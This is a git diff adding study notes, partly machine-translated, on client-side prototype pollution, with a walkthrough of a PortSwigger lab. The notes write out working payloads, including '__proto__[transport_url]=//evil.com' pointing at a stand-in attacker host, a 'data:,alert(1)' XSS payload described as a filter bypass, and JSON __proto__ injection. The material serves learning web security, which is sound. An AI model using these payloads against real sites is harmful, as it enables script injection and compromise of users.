@@ -1,4 +1,4 @@
-# prototype pollution
+<img width="804" height="277" alt="image" src="https://github.com/user-attachments/assets/3f32f2a6-3ef9-4d4c-9eb0-e1417be8eb63" /># prototype pollution
 
 
 <details>
@@ -711,6 +711,149 @@ XSS from Prototype Pollution.
 <details>
   <summary>Prototype pollution sources</summary>
 
+🔥 **1) Sink --- the sink (or the hole into which the danger comes)**
+==========================================================
+
+### What is a Sink?
+
+It is a place in the code where **dangerous execution** occurs:
+
+- DOM sink → `innerHTML`, `src`, `href`, `eval`, ...
+
+- System sink → Execute commands
+
+- App sink → Add scripts --- Download files --- Send requests --- etc
+
+As long as the application **uses a feature** and you were able to add it in the prototype → then you have reached Sink.
+
+* * * * *
+
+
+🧩 **2) Gadget --- Exploitation Device **
+=================================
+
+**Device = the property that the application uses without it being present in the object itself.**
+
+Meaning:
+
+- If the object does not have `transport_url`
+
+- And the developer writes:
+
+`let url = config. transport_url || defaults. transport_url;`
+
+Meaning:
+
+- If **config.transport_url** exists → use it
+
+- If **it does not exist** → use default
+
+In the polluting:
+
+`Object.prototype.transport_url = "http://evil.com"`
+
+The config will look like this:
+
+`config = {} // There is no transport_url`
+
+But because it is inherited from Object.prototype, so:
+
+`config.transport_url === "http://evil.com"`
+
+This is a gadget, because you can:
+
+- Add property
+
+- The application uses it without knowing that it is coming from the attacker
+
+* * * * *
+
+📌 **The importance of the exploitation device (Gadget)**
+=================================================
+
+Not any property remains useful.\
+Necessary:
+
+1. The application uses it in an important place
+
+2. It is used without sanitization
+
+3. It is used in Sink (such as .src, .href, eval)
+
+* * * * *
+
+
+💣 **The example I mentioned is PortSwigger**
+=================================================
+
+✨ Pollution:
+---------
+
+The attacker works:
+
+`https://site.com/?__proto__[transport_url]=//evil.com`
+
+This leaves:
+
+`Object.prototype.transport_url = "http://evil.com"`
+
+* * * * *
+
+✨ Weak code:
+---------------
+
+`let transport_url = config. transport_url || defaults. transport_url;`
+
+Because config is empty, transport_url is inherited from prototype.
+
+* * * * *
+
+✨ Sink:
+-----------
+
+`let script = document. createElement('script');
+script.src = `${transport_url}/example.js`;
+document.body.appendChild(script);`
+
+The developer remembers that transport_url is **not user-controlled**\
+But the hacker took control of it from the prototype.
+
+Result:
+
+`<script src="//evil.com/example.js"></script>`
+
+This is classic **DOM-based XSS**.
+
+* * * * *
+
+🎇 **More dangerous version (Direct Payload)**
+=================================
+
+`https://site.com/?__proto__[transport_url]=data:,alert(1);//`
+
+So it remains:
+
+`script.src = "data:,alert(1);//example.js"`
+
+Although the addition of `/example.js` is related to the comment `//`.
+
+Result:\
+Direct implementation of alert().
+
+* * * * *
+
+🧠 **Very easy conclusion**
+==========================
+
+Prototype Pollution alone:
+
+✔️ Contaminates prototype\
+❌ Not exploit
+
+Prototype Pollution + Gadget + Sink:
+
+💥Full exploit (XSS --- RCE --- hijack --- script injection)
+
 
 
 
@@ -732,6 +875,250 @@ XSS from Prototype Pollution.
 
 
 
+🎯 **First: What does Client-side Prototype Pollution mean?**
+=======================================================
+
+This means that as an attacker you can:
+
+1. Edit the **Object.prototype** from **Front End itself** (browser)
+
+2. And let all the objects on the page inherit the properties you injected
+
+3. After that, you find **gadget + sink** = and convert it to **DOM XSS**
+
+The whole thing is 3 steps:
+
+### 1) You find **source** (something that accepts `__proto__` from you)
+
+### 2) Prototype contamination
+
+### 3) Find a gadget with which the attack can be carried out (such as innerHTML or src)
+
+* * * * *
+
+🔥 **Second: How do we find the Prototype Pollution Source manually?**
+============================================================
+
+Idea:\
+Try modifying the prototype by:
+
+- **Query**
+
+- **Fragment (#)**
+
+- **JSON input**
+
+- **web message (postMessage)**
+
+### 👇 A very simple experience
+
+You will see this page:
+
+`https://victim.com/?__proto__[foo]=bar`
+
+Open **Console** and type:
+
+`Object.prototype.foo`
+
+If the result:
+
+`"bar"`
+
+**pollution** prototype → you have **source**.
+
+if:
+
+`undefined`
+
+Still **it doesn't work**... Try different formulas:
+
+✔️ Bracket notification
+
+`?__proto__[foo]=bar`
+
+✔️ Do notation
+
+`?__proto__.foo=bar`
+
+✔️ Nested objects
+
+`?__proto__[x][y]=123`
+
+✔️ From fragment
+
+`#?__proto__[foo]=bar`
+
+✔️ in JSON\
+You send JSON with `{"__proto__":{...}}`
+
+* * * * *
+
+🎯 **Summary of this stage**
+=======================
+
+> You are looking for any method that will allow you to add property to prototype.
+
+After each attempt, you must return to the console and see:
+
+`Object.prototype.foo`
+
+* * * * *
+
+🔥 **Third: How do we find Gadget manually?**
+=====================================================
+
+Now you know that there is **source**\
+Now you want to see the application using any property you can play in.
+
+👇 Simple steps:
+------------------
+
+### 1) Look at the properties the application uses
+
+like:
+
+-config.url
+
+- config. transport_url
+
+-template
+
+-message
+
+-render
+
+-html
+
+-src
+
+-loadScript
+
+-xhr.url
+
+-options.something
+
+Anything of this type can be a **gadget**.
+
+* * * * *
+
+
+### 2) Lock Response Interception in Burp
+
+To modify the JS before it executes.
+
+### 3) Add at the beginning of the script:
+
+`debugger;`
+
+To stop implementation.
+
+* * * * *
+
+### 4) In console you write:
+
+`Object.defineProperty(Object.prototype, 'XXXX', {
+    get() {
+        console.trace();
+        return "polluted";
+    }
+});`
+
+Replace XXXX with potential for gadget\
+like:
+
+- transport_url
+
+-template
+
+-url
+
+- handler
+
+-callback
+
+-render
+
+* * * * *
+
+
+### 5) Allow the browser page to continue (continue)
+
+If **stack trace** appears on the console → Bravo!\
+This means:
+
+>The application reads the feature you injected\
+>So it's a potential **gadget**.
+
+* * * * *
+
+### 6) Open the stack trace
+
+The browser will take you to the line that the feature is reading.
+
+See next:
+
+-Does the property exceed innerHTML?
+
+- Are you going to SRC?
+
+- Do you follow eval?
+
+- Do you use constructing script tag?
+
+If ah → de **sink** successful → exploit ready.
+
+* * * * *
+
+🤖 **Why is DOM Invader easier?**
+===============================
+
+Because DOM Invader:
+
+✔️ Tests all automatic pollution methods\
+✔️ Auto detects gadgets\
+✔️ It teaches you which line property\ is used in
+✔️ PoC XSS ready\
+✔️ It is activated from Burp Browser only
+
+This means that instead of wasting an hour, you can finish the topic in **two seconds**.
+
+* * * * *
+
+🧠 **The summary that will get you started on laptops immediately:**
+=============================================
+
+### ✔️ Step 1 --- Did you find the source?
+
+`Object.prototype.foo === "bar"`\
+If it works → continue
+
+### ✔️ Step 2 --- Turn on Gadget
+
+Which property the application uses and you can do:
+
+`__proto__[PROPERTY]=VALUE`
+
+### ✔️ Step 3 --- Did you find a Sink?
+
+innerHTML\
+eval\
+src\
+href\
+setTimeout\
+script insertion
+
+### 💥 Step 4 --- XSS is ready
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -741,6 +1128,53 @@ XSS from Prototype Pollution.
 
   
 </details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -756,6 +1190,192 @@ XSS from Prototype Pollution.
 
 
 
+# 1. **`Find a prototype pollution source`**
+
+```js
+vulnerable-website.com/?__proto__[car]=tesla
+# or
+vulnerable-website.com/?__proto__.car=tesla
+```
+
+> ## and in console write:
+
+```js
+Object.prototype
+```
+
+<img width="890" height="357" alt="image" src="https://github.com/user-attachments/assets/a16f8dff-24db-49ca-ae4f-ea8e74247a28" />
+
+> we found source
+
+
+# 2. **`Identify a gadget`**
+
+> ### in sourse tab found js files of website
+
+<img width="924" height="611" alt="image" src="https://github.com/user-attachments/assets/69f54bc9-57b2-44fb-8ddd-c3da8d9da268" />
+
+> ## in **`searchLogger.js`** found:
+
+```js
+ if(config.transport_url) {
+        let script = document.createElement('script');
+        script.src = config.transport_url;
+        document.body.appendChild(script);
+    }
+```
+
+
+<img width="804" height="277" alt="image" src="https://github.com/user-attachments/assets/8b59b25d-434c-4ef3-922c-cf652ccaefc0" />
+
+
+```js
+web-security-academy.net/?__proto__[transport_url]=tesla
+```
+
+> ## in elemets tab we will found new element added
+
+<img width="1239" height="696" alt="image" src="https://github.com/user-attachments/assets/bcba0ebd-0835-4421-b7cc-9df06138db9f" />
+
+> ## change it's content
+
+```
+/?__proto__[transport_url]=data:,alert(1);
+```
+
+<img width="1570" height="594" alt="image" src="https://github.com/user-attachments/assets/7f5c75c5-dfb3-4d40-981b-cbf2fbd5c4bb" />
+
+---
+---
+
+
+📌 The basic idea before anything else
+------------------------------
+
+When JavaScript searches for a property **and cannot find it within the object itself**, it searches for it in the **prototype chain**.
+
+Like this:
+
+`obj → Object.prototype → null`
+
+* * * * *
+
+🎯 Now we return to our words:
+=======================
+
+❓ What does “config.transport_url not recognized in the object itself” mean?
+---------------------------------------------------------------
+
+Meaning:
+
+`config = {
+  mode: "prod",
+  Retries: 3
+}`
+
+If you ask:
+
+`config.transport_url`
+
+You won't find it inside.
+
+What will JavaScript do here?\
+He will look for it in:
+
+`Object.prototype.transport_url`
+
+If he finds it there → he will take it and use it.
+
+* * * * *
+
+⚙️ Gadget = The feature **the code uses** And if it finds it in the prototype... disaster strikes.
+--------------------------------------------------------------------------
+
+example:
+
+`sendData(config.transport_url);`
+
+The code uses `transport_url`\
+But **I don't know** in config\
+So he goes to the prototype.
+
+What do you work for:
+
+`JSON.parse(`{
+  "__proto__": { "transport_url": "tesla" }
+}`);`
+
+You stay dirty:
+
+`Object.prototype.transport_url = "tesla"`
+
+When the code works:
+
+`sendData(config.transport_url)`
+
+It will go to the one in Object.prototype\
+Therefore, it remains Vulnerable Gadget 💣
+
+
+# **`why we write /?__proto__[transport_url]=data:,alert(1); not /?__proto__[transport_url]=alert(1);`**
+
+#2 - The JavaScript inside the URL needs a "URL Scheme" to work
+========================================================
+
+If you wrote:
+
+`alert(1)`
+
+This is **not a URL**\
+If the browser sees something that is not a URL → it will likely ignore it or throw an Error**\
+It will not execute any JavaScript.
+
+We must type the URL "schema" for the browser to accept the value.
+
+* * * * *
+
+#3 -- The "data:" scheme runs JavaScript
+=======================================
+
+There are many schemes in the URL:
+
+- `http://`
+
+- `https://`
+
+- `ftp://`
+
+- `mailto:`
+
+- **data:** ← What we want
+
+* * * * *
+
+example:
+=====
+
+`data:,alert(1);`
+
+The browser interprets this as:
+
+- scheme = `data:`
+
+- data = `alert(1);`
+
+Therefore, JavaScript is executed ✨.
+
+* * * * *
+
+#4 - Why don't we use `javascript:`?
+===================================
+
+Because many modern frameworks **block** this schema.
+Such as React, Angular, and Next.js --- they remove it automatically.
+
+But `data:` is allowed by most systems.
+It is an excellent bypass.
+
+
 
 
 
@@ -764,6 +1384,39 @@ XSS from Prototype Pollution.
 
   
 </details>
+
+
+
+
+
+
+
+
+<details>
+  <summary>Lab: DOM XSS via an alternative prototype pollution vector</summary>
+
+
+
+
+
+
+  
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
